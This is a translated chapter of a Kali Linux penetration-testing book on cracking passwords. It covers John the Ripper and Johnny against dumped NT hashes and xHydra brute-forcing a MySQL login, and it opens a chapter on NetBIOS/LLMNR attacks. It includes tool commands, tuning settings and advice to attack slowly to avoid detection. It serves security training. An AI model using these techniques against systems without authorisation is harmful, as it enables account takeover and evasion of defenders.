# Kali Linux 2018：Windows 渗透测试（二）

> 原文：[`annas-archive.org/md5/1C1B0B4E8D8902B879D8720071991E31`](https://annas-archive.org/md5/1C1B0B4E8D8902B879D8720071991E31)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第五章：密码攻击

您遇到的任何人都会告诉您，弱密码是导致许多成功入侵的原因，无论是本地还是远程。作为受过训练的网络管理员或安全工程师，您已经多次建议用户使其密码更加安全。您可能没有意识到的是，许多技术专业人员使用弱密码或密码模式，不仅危及自己的帐户，而且危及他们维护的整个网络。本章将向您展示几种测试网络密码的工具，以便您可以帮助指导用户养成更好密码的习惯。

我们将在本章学习以下主题：

+   密码攻击计划

+   见我的朋友，约翰尼

+   见约翰尼的父亲，约翰·里帕

+   见前任—xHydra

哈希算法的性质是所有哈希应该大致相同的长度，似乎并不更可能有人能够破解以下内容：

```
$6$NB7JpssH$oDSf1tDxTVfYrpmldppb/vNtK3J.kT2QUjguR58mQAm0gmDHzsbVRSdsN08.lndGJ0cb1UUQgaPB6JV2Mw.Eq. 
```

任何比他们更快破解的：

```
$6$fwiXgv3r$5Clzz0QKr42k23h0PYk/wm10spa2wGZhpVt0ZMN5mEUxJug93w1SAtOgWFkIF.pdOiU.CywnZwaVZDAw8JWFO0
```

遗憾的是，即使在一台慢速计算机上，密码`Password`的第一个哈希值也将在不到 20 秒内被破解，而`GoodLuckTryingToCrackMyPassword!`的第二个密码哈希值可能需要数月才能破解。以下列表说明了您可以在互联网上找到的数十个单词列表中找到的一些密码，这些密码使得破解密码变得更加容易。一些常见的哈希可以通过[`www.google.com`](https://www.google.com)破解，只需将哈希粘贴到搜索栏中即可。大多数网络应用程序和操作系统会向用户选择的密码添加一些字符，称为“盐”，以使简单的加密哈希变得更加复杂和不易猜测。

以下屏幕截图显示了一些明文密码示例及其哈希值：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/a177e90f-92d6-4fbc-8bfb-dc7486f52ed6.png)

# 密码攻击计划

密码通常是任何系统或网络的关键。自计算机诞生以来，密码一直被用来阻止未经授权的人查看系统数据。因此，密码破解是黑客行业中非常需要的技能。捕获或破解正确的密码，您就拥有了通往王国的钥匙，可以随时随地访问任何地方。随着我们的讨论，我们还将谈一下如何创建强密码。如果您是一位阅读本书的系统管理员，那么您就是我们所说的人。攻击者正在寻找的是您的密码。当然，每次登录时输入 12 或 14 个字符的密码都很痛苦，但您的网络有多重要呢？

就个人而言，我们希望从一开始就不要使用*密码*这个词来表示这个功能。它应该被称为密钥。系统的普通用户会因为受密码保护的数据而哭泣和抱怨。大多数人将*密码*这个词与进入俱乐部或其他东西联系起来。用户会在所有财产上安装锁和防盗警报，但在计算机上使用一个四个字母的密码。人们将*密钥*这个词与锁定重要物品联系起来。实际上，如果您的密码只是一个*单词*，您将在几分钟内被攻破。最好使用密码短语。像*玛丽有一只小羊*之类的东西比单个单词好得多。随着我们在本章中思考您使用的密码的重要性，我们将看到这一点有多重要。

# 破解 NTLM 代码（重温）

密码攻击的一种方法在第四章中已经涵盖，*嗅探和欺骗*。在运行 NetBIOS 的 Windows 网络上，捕获 NTLM 哈希就像小孩玩耍一样简单。它们就漂浮在 ARP 云中等待被摘取。正如我们在前几章中所展示的，当您使用 Metasploit 时，您甚至不需要将此哈希破解为密码，而只需将哈希传递给另一个 Windows 系统。

有时，你需要实际的密码。系统管理员有时会变懒，会在几类设备上使用相同的密码。假设你有一些 Windows 哈希值，你需要进入一个路由器或一个你不确定密码的 Linux 机器。很有可能其他系统的密码是相同的，所以你可以破解 NTLM 协议泄漏的哈希值。我们中的许多人都有在基础设施设备上重复使用密码的行为，尽管我们知道更好的做法。对于路由器和其他基础设施设备，使用不同的用户名和密码可能更安全，除非绝对必要，不要使用域管理员帐户登录任何机器。

黑客提示：

关闭 NetBIOS，并使用 Kerberos 和 LDAP 的 Active Directory 进行 Windows 登录和网络功能。

在本章中，我们将研究破解密码，而不仅仅是传递哈希值。

# 密码列表

对于任何一个好的密码破解器，有时破解密码的最快方法是使用密码列表。有时甚至最好运行一个包含最差的 500 个密码的列表，以查找那些使用糟糕密码的懒惰者。大多数情况下，一个糟糕的密码可以在几秒钟内被破解，而使用强密码短语可能需要几个小时、几天或几周。

Kali 包含许多密码，你可以在以下目录`/usr/share/wordlists`中找到它们。以下也是一些好的密码文件的链接和列表。谷歌搜索也会带你找到常见密码的列表，以及从网站上窃取的密码列表。当使用被窃取的密码列表时，只使用已经清理过用户名的列表。使用完整的被盗凭证（用户名和密码）可能会让你陷入麻烦。只有密码列表，你只有一个没有与原始用户关联的单词列表。这是安全和合法的使用：[`wiki.skullsecurity.org/Passwords`](https://wiki.skullsecurity.org/Passwords)。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/d37e5369-d28b-42f0-9ba6-e6d0ff48b941.png)

# 清理密码列表

有时，当你得到一个密码列表时，列表可能是文本文件中的制表列，或者可能有奇怪的空格或制表符与文件中的单词混合。你需要清理这些空格和制表符，并且每行只有一个单词，以便单词列表可以与密码破解器一起使用。

Unix 的最早概念之一是系统中的小程序可以被管道连接在一起执行复杂的任务。Linux 是 Unix 的红头发表亲，这些工具都包含在每个 Linux 发行版中，包括 Kali。这是老派的方法，但一旦你理解了如何做，它就非常有效。我们将逐个介绍使用的每个程序，然后展示如何将它们串联在一起以执行这个任务，所有命令都在一行中。

以下是 500 个常见密码的列表。这些单词被列在一个 HTML 表中，并且行号已经编号，所以当复制到文本文件时，原始形式如下所示。你可以找到的大多数单词列表都包含大约相同的极其常见的糟糕密码，尽管我们使用的是英语，但其他语言也有单词列表。弱密码并不严格属于英语世界。

也就是说，下一个截图是非常常见但非常薄弱的英语密码的一个很好的例子。展示所有 500 个单词会浪费空间，所以我们在出版商的网站上提供了`500-common-original.txt`文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/a93639c7-a6aa-4cbb-bc90-9b3603c7deb1.png)

请注意，我们左侧有行号需要丢弃，每行有五个单词，用制表符和空格分隔。我们需要将每个单词移到新的一行。

`cat`命令读取文本文件并将其打印到屏幕或另一个文件中。与`cut`命令一起使用，我们将首先剥离行号。`cut`命令将制表符视为字段之间的间隔，因此数字是行中的第一个字段。我们想要剪切数字并保留单词，所以我们剪切第一个字段并保留其他字段。为此，请运行以下命令：

```
cat 500-common-orginal.txt | cut -f2  
```

我们得到了如下返回的输出。如果你看一下，你会发现这是每行中仅有的第一个单词的列表，而不是整个列表。使用`-f2`标志，我们已经剪切了除每行中的第二个字段之外的所有内容。以下截图已经删除了一些单词，以保持本书的 G 级评级，但有些人天生粗鲁。列表中的一些单词可能不适合打印，但它们是前 500 个常见密码。在黑客行为中，你正在处理一个人的本性，这并不一定是社会上正确的。人们经常会选择粗鲁的词语，当他们认为没有人会看到他们写的东西，或者他们认为自己是匿名的时候。 

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/ee8a388b-6f2a-4f71-979c-15a6321290e2.png)

由于我们想要每行的所有单词，我们必须在命令中包括其他五列。一行中有五个单词，加上数字，共有六个字段，我们想要剪切第一个字段（数字）并保留其余部分，所以我们将`-f`标志更改为`-f2-6`；这将剪切字段 1 并打印出字段 2 到 6。我们看到返回已经去掉了数字行，但我们仍然每行有五个单词。这在密码破解器中不会正确运行；我们仍然需要将所有单词移到自己的一行上：

```
cat 500-common-orginal.txt | cut -f2-6 
```

这个命令字符串去掉了行号，尽管保留行号不会超过几秒钟。但这样做不够整洁，有时整洁是很重要的。以下截图是该命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/c3d81414-1091-441c-a92e-03d04b4f6e40.png)

为了让所有单词都在新的一行上，我们使用`--output-delimiter`标志，并使用`$'\n'`的值，这告诉输出每个分隔符（即制表符空格）在该行上将下一个字段移到新的一行：

```
cat 500-common-orginal.txt | cut -f2-6 -output-delimiter=$'\n'   
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/5096d4b3-8650-4010-9de3-bdd5b00a550d.png)

现在我们每个单词都在新的一行上，但我们还需要将其打印到文件中以供使用。为此，我们将使用重定向命令`>`将输出发送到新的文本文件。请注意，`>`命令将正在运行的命令的输出发送到文件，但如果文件名存在，它将覆盖文件的内容。如果要增加已有文件的大小，请使用`>>`命令将输出附加到已有文件中。

以下截图显示了将单词发送到弱密码的工作文件，并测试输出文件的内容和格式：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/89240884-a7be-49d5-998b-148d100b7551.png)

运行`ls`命令来双重检查你是否在正确的目录中，并且你选择的输出文件不存在，然后运行以下输出到一个文件：

```
cat 500-common-orginal.txt | cut -f2-6 --output-delimiter=$'\n' > 500-common.txt

```

黑客笔记：

如果你意外地运行了`cat 500-common-orginal.txt | cut -f2-6 --output-delimiter=$'\n' > 500-common-original.txt`命令，你将覆盖原始文件，并且最终得不到你想要的新文件内容。

请注意，这次屏幕上没有输出，但当再次运行`ls`命令时，我们会看到工作目录中的新文件。通过查看新文件，我们可以看到我们准备好供使用的新密码文件。

# 我的朋友约翰尼

首先，我们将谈谈我的朋友约翰尼。约翰尼是我另一个朋友约翰的 GUI 前端。对于大多数密码破解任务，这是使用约翰的简单方法。它使用大多数密码破解会话的正常默认值。一旦你捕获了一些哈希值，将它们保存到一个文本文件中并打开约翰尼。

以下是 LXDE 桌面的屏幕截图，显示了 Johnny 的位置。您还可以在所有其他桌面上找到它，位置相同，应用程序| 05 - 密码攻击| johnny：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/b1b70fb3-78ff-4d0a-992e-0738285fc569.png)

我们正在使用书中早期的先前利用中的密码哈希，当时我们正在传递哈希。我们已经将列表缩短，只包括我们认为对网络系统具有关键访问权限的两个帐户的哈希：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/c0494d80-bd5c-4de9-ae1f-c1537e70bdb9.png)

一旦 Johnny 打开，点击“打开密码文件”按钮，选择您保存用户哈希值的文本文件。这将把文件加载到 Johnny 中。

黑客笔记：

最好删除访客和任何其他您不想破解的用户帐户。这将减少破解密码所需的时间。如您所见，我们只破解了两个帐户。

以下截图是您对 Johnny 界面的第一印象。非常简单，但功能强大：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/00de9048-f07f-4d58-9ef0-b28c4ea265a3.png)

因为这是一个测试网络，对话框窗口中只有两个用户名。在生产网络中，将有与组织中被允许登录系统的人数一样多的用户名。很可能这两个用户中至少有一个具有管理员特权。

黑客的笔记：

请记住，管理员帐户始终是 UID 500。有时，管理员会更改管理员帐户的名称。这在某些情况下会隐藏帐户，但一旦您获得了帐户的 UID，找到管理员就像 500 一样容易。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/f3a72e5f-fd23-4dfe-afc4-f8b605d29c57.png)

我们知道这些哈希来自 Windows 7 系统。在 Windows 7 中，默认不再使用 LM 哈希，因此我们必须更改默认的 LM 哈希破解。如果不更改，您将在“输出”选项卡中收到以下错误：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/baa2a6ed-d7e9-4864-b02c-291725df4137.png)

点击“选项”选项卡，并将自动检测更改为 nt2，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/33e4bbf3-983d-49f3-948e-dfcf41a13b90.png)

现在点击“密码”选项卡，然后点击“开始攻击”按钮。这将开始破解过程。您可以在屏幕底部选项卡中看到该过程：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/a20267d6-67e1-4d0c-8fa0-ec0616c1609a.png)

请注意，它现在显示格式为 nt2 并正在运行。喝杯咖啡吧。这可能需要一段时间。

还要注意我们有一个“暂停攻击”按钮。如果需要，您可以暂停攻击。

有时，开源应用程序会有怪癖。Johnny 也不例外。有时，在进行破解运行时，该过程将运行并破解密码，但密码不会显示在 GUI 窗口中。如果“暂停攻击”按钮变灰，只能点击“开始”按钮，则运行已完成，并且密码已被破解。您可以通过单击“选项”按钮找到破解信息。此页面还将显示运行所需的时间以及破解的密码。这是获取运行所有结果的最佳页面。

您可以在下一个截图中看到，使用大写和小写字母、数字和特殊字符的复杂性，破解两个密码分别花费了 7 小时 18 分钟，一个有六个字符，一个有七个字符：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/dd94adae-ec16-4f22-a677-4b8dff46b6df.png)

# John the Ripper（命令行）

John the Ripper 是 Johnny 的基础应用程序。您可能和我们一样，在使用密码破解工具（如 John the Ripper）时，更喜欢命令行而不是 GUI。您可能选择 CLI，因为它比 GUI 使用更少的资源，或者因为您正在通过 SSH 连接到没有 GUI 界面的服务器进行工作。使用 John the Ripper 很容易，而且通过使用命令行，可以使用更多选项和方法来使用 John，这些选项和方法尚未添加到 Johnny 中。

您可以看到 John 支持的各种哈希算法，并通过运行以下命令测试系统的破解速度：

```
john -test
```

这将运行 John 支持的所有各种哈希算法，并为各种哈希所需的速度提供信息。以下截图显示了`test`标志的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/aa2f8949-fc96-47cd-a7b5-3225742bb706.png)

我们将对从先前对系统的利用中获得的一组哈希运行 John。请注意我们使用的标志来执行此操作。我们使用`--format=nt2`，然后选择文件：

```
john -format=nt2 hashdump.txt  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/ec663315-266f-4fcf-abf2-c54ff114df92.png)

通过这次破解运行，我们正在破解超过六个字符的密码。请注意运行此过程所花费的时间。这表明，当涉及密码时，长度比复杂性更重要。

在下面的截图中，您可以看到破解一个相当简单的七位字符密码花了 1 天 23 小时。第二个八位字符的密码在 4 天 14 小时 56 分钟后仍未破解。是的，每增加一个字符，破解所需的时间就会呈指数增长：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/b800440e-7b0f-49b8-bbb6-7c5c41e4f0eb.png)

通过在运行后运行`-show`标志，您可以看到已破解的单词，以及我们还有一个未破解的单词：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/3e46c6d9-95e8-44d0-9c42-5b17ba9787da.png)

这次破解是在一个运行处理器的虚拟机上完成的。增加处理器将增加破解过程中运行的线程数量，从而缩短任务所需的时间。有些人构建了装满处理器和 GPU 卡的机器，可以在几小时内破解我们正在使用的密码。有些人使用亚马逊 AWS 并设置具有大量处理能力的实例，但这需要大量资金。众所周知，一些聪明的大学生启动了用于建模太阳系的大学超级计算机，并使用这些系统快速破解密码。即使您的邻里邪恶黑客拥有这些系统，更长的密码仍然更好。这些系统是使用长度超过 14 个字符的密码或密码短语的原因。即使使用超过 14 个字符的密码短语，这表明如果您拥有哈希值，那么只是时间、金钱和处理能力的问题，您就可以得到密码。

# xHydra

xHydra 是一个名为 Hydra 的密码破解器的图形用户界面前端。Hydra 可用于离线和在线密码破解。Hydra 可用于许多类型的在线攻击，包括针对 MySQL、SMB、MSSQL 和许多类型的 HTTP/HTTPS 登录的攻击，仅举几例。

我们将使用 xHydra 攻击运行 WordPress 站点的机器上运行的 MySQL 服务。由于该机器正在运行 WordPress 站点和 MySQL 服务，因此可以猜测数据库登录的用户名是`wordpress`，即默认的管理员帐户。默认情况下，MySQL 不会阻止暴力破解攻击，因此我们知道这次攻击有很大的机会成功。

要在 Kali 版本 1.x 中启动 xHydra，您需要转到 05 - 密码攻击|在线攻击|hydra-gtk。hydra-gtk 将启动 xHydra。是的，我知道这很令人困惑，但它们是相同的。以下截图显示了来自 LXDE 的菜单。（是的，那是我后面的摩托车，是哈雷）

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/1ffa25b9-111d-4611-a5b6-5cec03520755.png)

需要记住的一点是，在 Kali 中，就像在任何其他 Linux 发行版中一样，您可以打开终端并在提示符处输入命令，也可以通过按下*Alt* + *F2*打开命令对话框。这将为您提供所谓的**运行框**。所有桌面都有这个功能。在接下来的两个截图中，我们展示了如何找到 xHydra，`# locate xhydra`以及如何在终端中通过名称`xhydra`启动它；以及当您通过*Alt* + *F2*键盘快捷键调用命令时的外观。以下是 Gnome 3 的运行框：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/c86d986a-e75d-40ed-ac59-c9dff6db2724.png)

黑客提示：

正如我们所讨论的，Gnome 3 会以*它们的方式*做事情！即使它是错误的和令人困惑的。您输入要运行的命令，然后按*Enter*来运行它。关闭按钮将取消您的操作，并将您带回桌面。在所有其他桌面上，运行框会给您一个运行或确定按钮，它将运行命令。此外，在这些运行框中键入命令并按*Enter*将运行命令。

您还可以通过命令行打开 xHydra，方法是输入以下内容：

```
xhydra &  
```

&命令告诉 Bash 终端将应用程序后台化，并将命令提示符还给您。如果不添加&，您将锁定终端窗口，直到完成使用 xHydra。它会运行，但如果关闭此终端窗口，xHydra 也将关闭。

使用&会将从命令行运行的任何命令后台化：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/c5734e65-2a6f-4c89-a6ab-c54217aec61e.png)

打开 xHydra 后，我们会得到以下窗口。第一个选项卡“目标”用于设置攻击的目标和协议。您可以攻击单个 IP 地址，或从文本文件中选择目标主机列表。协议字段是选择协议类型。请注意，窗口底部显示了从命令行运行攻击时将使用的命令行字符串。

这是一个有用的学习工具，可以学习命令行选项及其工作原理：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/f80b8bde-5cfd-4b3e-903c-9e5ffa3ab9bf.png)

我们正在攻击一个单一的主机，所以我们添加 IP 地址，将端口设置为`3306`，默认的 MySQL 服务端口，并选择 mysql 作为协议。

请注意，此窗口的选项部分有几个不错的选项。如果 MySQL 服务器启用了 SSL，您将在 SSL 框中打勾。对于任何其他使用 SSL 的服务，如 SSMTP、SIMAP 或 SLDAP，也会打勾。详细输出复选框将在运行时给您更详细的输出。显示尝试复选框在运行时将显示实际针对系统运行的密码。这很有趣，但会产生大量输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/fd66bbd3-5759-4984-9a01-47aadd3479b8.png)

单击密码选项卡设置攻击的密码部分。在这里，我们添加用户`root`，选择生成单选按钮，并将字段更改为`1:8:a`。在底部字段中，您可能需要勾选尝试登录作为密码和尝试空密码字段。

在生成字段中，我们添加了`1:8:a`。这告诉 Hydra 运行密码从一到八个字符。小写字母`a`告诉 Hydra 只运行小写字母。如果我们添加字符串`1:8:aA1% .`，这将生成包括大写和小写字母、数字、百分号、空格（是的，在百分号和逗号之间有一个空格）和点的密码。从这里混合和匹配。

在这里，您将找到尝试登录密码的复选框字段，它将尝试使用登录名作为密码，如`admin:admin`，以及空密码的复选框。您还将在这里找到一个用于反转登录名的复选框，例如`nimda`，用于`admin`登录的密码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/87cdeb43-c1f1-4c45-95b9-f98603569365.png)

接下来设置调整选项卡：

+   由于我们正在攻击一个主机，将任务数量减少到八个

+   由于主机在同一网络上，将超时值降低到 10

+   由于这是一个主机，攻击使用一个用户名，所以勾选框选项以在找到第一对后退出

您将会发现，设置的任务可能低于实际运行的任务。我们设置为 8，但后来我们会看到实际运行的任务是 4。服务器只能处理四个运行线程，所以我们只能得到这些。运行线程可以根据 Kali 攻击工作站上发生的其他事情而改变，因此最好设置为比运行负载更多。请注意，将其设置得比实际运行任务高（例如，将其设置为 16）会导致应用程序挂起。这个数字也可能会根据被利用的服务类型而有所增加或减少：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/201d9c41-27c3-4e03-a29f-06680e12e652.png)

MySQL 攻击的具体选项卡将保持默认设置。实际上，MySQL 攻击不使用任何这些设置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/ce0b29f1-4f5d-4e0e-bab4-67978b5308e1.png)

现在我们准备点击“开始”选项卡，我们看到我们正在对那台服务器运行四个线程。这可能需要一段时间：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/f418e277-5979-4076-ad61-b68b45f0ea05.png)

黑客提示：

请注意，软件的作者，就像本书的作者一样，要求您不要将这些工具或信息用于军事、特工或非法目的。请记住，只能将您的绝地力量用于善良。

嗯。我们还有 217,180,146,596 个密码组合要尝试，估计时间为 199,661,463 天 22 小时。也许是时候换一个更强大的 Kali 工作站了。这可能需要一段时间。也许 546,659 年的假期是邪恶黑客的最佳选择。

幸运的是，估计值很高。接下来，我们看到我们的测试现在已经运行了 70 小时 39 分钟，没有破解长度为五个字符的密码。在此期间，运行已尝试了 75,754 个密码，还剩下 12,280,876 个，估计运行时间为 11,454 天 13 小时。因此，为了书籍的利益，我们在这里停止测试，估计还剩下 32 年：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/fb38ebf8-99fc-48e6-af27-ab215c8a5e9e.png)

这次测试的速度主要由受害服务器的资源和设置决定。我们的受害服务器是一个低租金的 VM，这也是测试如此缓慢的原因之一。另一个限制因素是目标服务器可能太弱，持续的暴力攻击可能会将机器从网络中踢出。即使是具有大量资源的强大服务器也可能会出现**拒绝服务**（DoS）的情况。在进行暴力攻击时，您可能希望以较低和较慢的攻击速度为目标。作为攻击者，您不希望提醒管理员发动攻击。

这个测试还表明，捕获哈希并离线破解通常比在线攻击更快。还有一件事要记住：如果系统上运行任何入侵服务，您的攻击将在数年内被注意到。

因此，让我们在同一系统上尝试密码列表攻击。请注意，我们已将设置从生成更改为密码列表，并从 Kali 中包含的许多密码列表中选择了`rockyou.txt`密码列表。以下屏幕截图列出了目录并显示了压缩的`rockyou.txt`文件。您需要解压缩才能使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/ed0c5474-c7d0-49b7-9c55-0861edbd23e9.png)

在下面的屏幕截图中，我们已选择了未压缩的文件，准备好开始：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/af59282f-a357-4752-84e0-e0ba1be76a0f.png)

通过好莱坞现代奇迹，我们看到我们已经破解了密码`evil1`。经过 562 次尝试和 31 小时，我们成功了。这对于尝试的次数来说是很长的时间。再次强调，服务接受密码的速度是决定性因素，并且需要一段时间。目标服务器上的软件防火墙和密码尝试限制可能会使其花费更长的时间，甚至使其变得不可能。

如果正确的密码在密码列表中更靠后，那么破解所需的时间会更长：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/a6247528-385f-4abf-8a27-b28d83faceae.png)

# 总结

在这一章中，你学会了使用三种新的密码破解工具，并且学会了如何将新项目添加到主菜单中。Johnny 和他的前辈 John the Ripper 是你可以在 Kali 上找到的最受欢迎的工具，用于在本地机器上破解哈希值，所以当你测试用户的密码决策时，你可能会选择这两种工具中的一种。

Hydra 比基于 John 的基本工具有更多的选项，但随着增强的功能，复杂性也增加了。Hydra 旨在通过网络攻击特定设备，但正如你发现的那样，攻击面很小，而且工具非常吵闹。

你还学会了 Hydra 可以使用 GPU 而不是 CPU，从而使你的破解速度更快。

在下一章中，我们将学习古老和破损的协议 NetBIOS 和 LLMR，以及如何利用它们的漏洞来获取对 Windows 系统的访问权限。

# 进一步阅读

+   有关 John The Ripper 的更多信息：[`www.openwall.com/john/`](https://www.openwall.com/john/)

+   有关 Hashcat 的更多信息：[`hashcat.net/hashcat/`](https://hashcat.net/hashcat/)

+   有关 Hydra 的更多信息：[`github.com/vanhauser-thc/thc-hydra/`](https://github.com/vanhauser-thc/thc-hydra/)


# 第六章：NetBIOS 名称服务和 LLMNR-过时但仍然致命

在本章中，你将学习如何利用那些遗留的专有和破损的协议，它们仍然挂在几乎每个网络上，以你的优势，并获得你想要的访问权限。这是博最喜欢的攻击向量，他最喜欢的*低悬果实*，通常会导致对域和与该域相关的每个帐户的*完全控制*。在一年的时间里，最有可能有 80%的史诗级失败测试结果来自这种攻击向量的某种利用方式。

为什么我首先攻击的机器是 Windows 系统？答案是：NetBIOS，LLMNR，NTML 和 SMB 协议。

在本章中，我们将涵盖以下主题：

+   NetBIOS 名称服务和 NTLM

+   嗅探和捕获流量

# 技术要求

要跟着本章学习，你需要以下内容：

+   运行 Kali Linux 的副本

+   几个 Windows 操作系统（在虚拟机上运行这些系统也可以）

# NetBIOS 名称服务和 NTLM

在网络的早期，就在个人电脑诞生之后，人们希望能够从一个系统共享文件到另一个系统。在商业应用中，系统已经可以使用专有的网络协议进行网络化，比如 IPX（Internetwork Packet Exchange），托尔金环和同轴总线网络。所有这些专有协议的一个大问题是，它们都不能在它们之间进行交叉通信。这被称为供应商锁定，即使在今天，我们仍然有一些专有系统和协议。（是的，我在指责你，微软。）使用这些协议意味着为网络上的每个系统支付许可费-不仅是操作系统的成本，而且还需要额外的费用来网络化每个系统，然后在连接到网络的每个工作站上再额外收费。然后，是的，你可以让两个远离彼此的网络使用当时的电话线连接起来，但是系统必须运行相同的操作系统和网络协议才能进行通信。DEC 网络甚至不能在同一建筑物内与 Netware 网络进行通信，更不用说通过电话线进行通信了。这也是政府和军方所面临的问题，跨国通信和数据传输时代的到来，电话呼叫通过许多单点故障路由，没有办法使这些流量自行路由。通信网络可以通过打击一些战略要点而被关闭。需要一个自路由网络和一个共同的通信语言，于是 ARPANET 和 TCP/IP 协议套件出现了。我很幸运能在开始时参与其中，我从来没有想过它会发展成今天的样子。

在这段时间里，微软推出了他们自己的协议来网络 Windows 系统，但是，这些协议是专有的，只能在 Windows 系统上运行。其中第一个是 NetBUI。NetBUI 是一种不可路由的协议，几乎不需要配置，连接到同一个本地交换机或集线器的系统可以进行通信并愉快地共享文件和数据；然而，如果你想要在城镇之间发送文件，那么最好准备一个软盘。如果你在本地网络上有一个 UNIX 系统，你还需要软盘来将数据从你的 Windows PC 传输到 UNIX 服务器。NetBUI 只能在 Windows 上运行！当然，它很容易使用-你不需要成为网络工程师来连接到网络，你只需要插上你的电缆，通过知道其他计算机的名称，你就可以连接到它们共享文件，删除文件，甚至远程控制系统。哇，太酷了！除了，在那些日子里，Windows 没有安全性-没有。

记住，这是作为一个独立的个人电脑出售的，一个可以通过观察谁坐在电脑前的椅子上来控制安全性的系统。没有登录，没有用户帐户，没有 ACL，只是对本地网络上每个系统的开放和无限制访问。好吧，你正在读这本书，因为你要么在互联网安全领域工作，要么对此感兴趣，所以这里有一个课堂问题给你。*你觉得这种网络模型有问题吗？*如果没有，请退还这本书并购买《Better Homes and Gardens》的一本副本-你会得到更好的服务。与 UNIX 不同，它是从头开始设计成一个网络化的操作系统，Windows 从一开始就没有为此设计，今天仍然受到这些不良开端的影响。

那么这个魔术是如何运作的呢？当你连接一个系统到网络时，系统会发送 ARP 广播，说，“嘿，我的计算机名是 WS3，我在这里存储了这些好东西。”一个系统，通常是网络上的第一个系统，会成为主浏览器，它会跟踪机器名和网络资源。如果这个系统崩溃了，那么网络上的所有系统都会通过 ARP 进行选举，决定谁将成为下一个主浏览器。现在，如果你的网络上有不到 20 台机器，那么这一切都很好，但是如果在同一个网络上有超过 20 台机器，那么你现在就会遇到一个通信问题，而且每增加一台额外的机器，这个问题都会变得更加严重。

还记得 Trumpet Winsock 吗？Trumpet Winsock 是你必须手动加载到 Windows 系统上并与 com 端口进行斗争才能使其工作的第三方软件。这是 Windows 的第一个 TCP/IP 网络堆栈。微软后来收购了 Winsock 的开发人员，他们的源代码成为了 Windows NT 内置的第一个版本的 Windows TCP/IP 接口的基础。（不，微软并没有发明 TCP/IP）。

我们都知道问题所在：使用这种方法意味着你可以访问网络上的所有内容。没有数据是安全的，任何系统上的窥视者或小偷都无法触及，而且使用这种方法，没有办法追踪谁在访问这些数据。此外，你可以在没有登录和任何凭据的情况下远程控制这个系统。是的-你可以运行`del C:\Windows\*`并完全破坏一台机器。此外，远程位置的系统无法与总部通信，因为 NetBUI 是不可路由的。所以，我们都知道这不会起作用。微软最终也意识到了这一点，于是 NetBIOS 出现了-这是一个改进，但不是一个修复。这也是微软从 IBM 那里偷走大卫·卡特勒的时候，他带着他从 IBM 的 OS2 中的设计，设计并构建了 Windows NT 的时候。（是的，NT 的爸爸是 OS2。）NT 被设计成一个带有文件级安全用户帐户和 ACL 的网络化操作系统。

一个真正的网络操作系统。它也在一定程度上符合可移植操作系统接口（POSIX），因此它可以在有限的范围内与基于 UNIX 的机器进行通信。他们必须获得政府合同，当时政府系统的要求是符合 POSIX 标准。在这里，我们再次遇到了供应商锁定-是的，NT 有一些有限的 API 被认为是符合 POSIX 标准的，看起来很不错，但在现实世界中从来没有起作用。在尝试让这些 API 起作用时，微软的解决方案是*购买更多的微软产品*。它还带有一个用于网络接口的 TCP/IP 堆栈。现在，我们可能会说，“现在我们准备好了”。嗯-不完全是这样。微软一如既往地把“易用性”放在首位-当然，简单易用是一件好事，但在安全性方面并不总是如此。想想如果你不用锁门并保管好钥匙，那么进入你的房子会有多容易。如果你的门上没有锁，你永远不会把自己锁在外面。

